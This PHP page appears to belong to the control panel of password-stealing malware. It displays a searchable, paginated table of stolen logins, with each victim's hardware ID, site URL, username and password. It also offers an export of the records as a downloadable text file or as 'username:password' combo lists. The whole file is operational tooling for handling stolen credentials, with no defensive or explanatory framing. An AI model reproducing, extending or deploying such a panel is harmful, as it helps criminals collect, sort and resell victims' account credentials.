<?php
if(isset($_POST['export'])){
	include 'inc/config.php';
	include 'inc/functions.php';
	$like = empty($_POST['keyword'])?'':'WHERE hwid LIKE :search OR url LIKE :search';
	$data = $con->prepare("SELECT * FROM logs $like");
	$data->execute(array(':search' => '%'.$_POST['keyword'].'%'));
	$text = '';
	foreach($data->fetchAll(PDO::FETCH_OBJ) as $row)
		$text .= $_POST['exptype'] == 'uspass' ? $row->username.':'.$row->password.PHP_EOL:
			"######################".PHP_EOL.PHP_EOL.($_POST['hwid']?"HWID: $row->hwid".PHP_EOL:'').($_POST['url']?"Url: $row->url".PHP_EOL:'').
			($_POST['username']?"Username: $row->username".PHP_EOL:'')
			.($_POST['password']?"Password: $row->password".PHP_EOL:'').($_POST['time']?"Added: ".Ago($row->time).PHP_EOL:'').PHP_EOL;
	header('Content-Description: File Transfer');
	header('Content-Type: text/plain');
	header('Content-Disposition: attachment; filename=logs.txt');
	header('Content-Transfer-Encoding: binary');
	header('Connection: Keep-Alive');
	header('Expires: 0');
	header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
	header('Pragma: public');
	header('Content-Length: ' . strlen($text));
	echo $text;
	die();
}

include('header.php');
$perpage = $settings->logspg;
$init = isset($_GET['init']) && $_GET['init']%$perpage == 0 ? (int)$_GET['init'] : 0;
$end = isset($_GET['end']) && $_GET['end']%$perpage == 0 ? (int)$_GET['end'] : $perpage;
$search = isset($_GET['search'])?htmlspecialchars($_GET['search'],ENT_QUOTES,'UTF-8'):"";
$like = empty($search)?'':'WHERE hwid LIKE :search OR url LIKE :search';
$t = $con->prepare("SELECT COUNT(*) FROM logs $like");
$t->execute(array(':search' => '%'.$search.'%'));
$bots = $t->fetch()[0];
?>

<div id="content">
	<div id="content-content">
		<div id="content-header">
			<div id="logs-title">
				Password Logs
			</div>

			<div id="searchbar">
				<input type="text" name="search" placeholder="Search.." onkeyup="spr(event)"/>
				<script>
					function spr(k){
						var v = $('input[name="search"]').val();
						var s = v != '' ? '&search='+v : '';
						$('#content-footer').html('');
						$('#ajax-content').load('ajax/logs.php?init='+getPvar('init')+'&end='+getPvar('end')+s);
					}
				</script>
			</div>
			</div>
		</div>

		<div id="ajax-content">
			<div id="content-box">
				<table>
					<th>HWID</th>
					<th>Url</th>
					<th>Username</th>
					<th>Password</th>
					<th>Added</th>
						<?php
						printLogs($init,$perpage,$search);
						?>
				</table>
			</div>
		</div>

		<div id="content-footer">
			<div id="navigation">
				<ul>
					<li><a href="logs.php?search=<?php echo $search;?>"><<</a></li>
					<?php
					for($i = $init - $perpage*10; $i <= $init + $perpage*10; $i+=$perpage) {
						$pi = $i-$perpage;
						$pe = $i;
						$text = $i/$perpage;
						if($text > 0 && $i - $perpage < $bots) {
							if ($init == $i-$perpage && $end == $i) $text = "<span class=\"green\">$text</span>";
							echo "<li><a href=\"?init=$pi&end=$pe&search=$search\">$text</a></li>";
						}
					}
					$t = ((int)($bots/$perpage)) * $perpage;
					?>
					<li><a href="?init=<?php echo $t;?>&end=<?php echo $t + $perpage;?>&search=<?php echo $search;?>">>></a></li>
				</ul>
			</div>
		</div>
	<form method="POST">
<div id="content-content">
	<div id="content-header">
		<div id="content-title">
			<div class="user-title">
				Export Logs
			</div>
		</div>
	</div>
	<div id="content-box">
		<div id="content-strip">
			<div id="content-left">
				<div id="left-text">
					Keyword
				</div>
			</div>

			<div id="content-right">
				<input type="text" name="keyword" placeholder="Export logs that only contain.." />
			</div>
		</div>

		<div id="content-strip">
			<div id="content-left">
				<div id="left-text">
					Format
				</div>
			</div>

			<div id="content-right">
				<select name="exptype">
					<option value="standard">Standard</option>
					<option value="uspass">Username:Password</option>
				</select>
			</div>
		</div>

		<div id="content-strip">
			<div id="content-left">
				<div id="left-text">
					Parameters
				</div>
			</div>

			<div id="content-right">
				<span class="checktext"><input type="checkbox" name="hwid" />HWID</span>
				<span class="checktext"><input type="checkbox" name="url" checked="true" />Url</span>
				<span class="checktext"><input type="checkbox" name="username" checked="true" />Username</span>
				<span class="checktext"><input type="checkbox" name="password" checked="true" />Password</span>
				<span class="checktext"><input type="checkbox" name="time" />Added</span>
			</div>
		</div>

		<div id="content-strip2">
			<div id="content-left">
				<input type="submit" name="export" value="Export" />
			</div>

			<div id="content-right" class="export-result">
				<!-- Output -->
			</div>
		</div>
	</div>
</div>
	</form>

<?php
include('footer.php');
?>
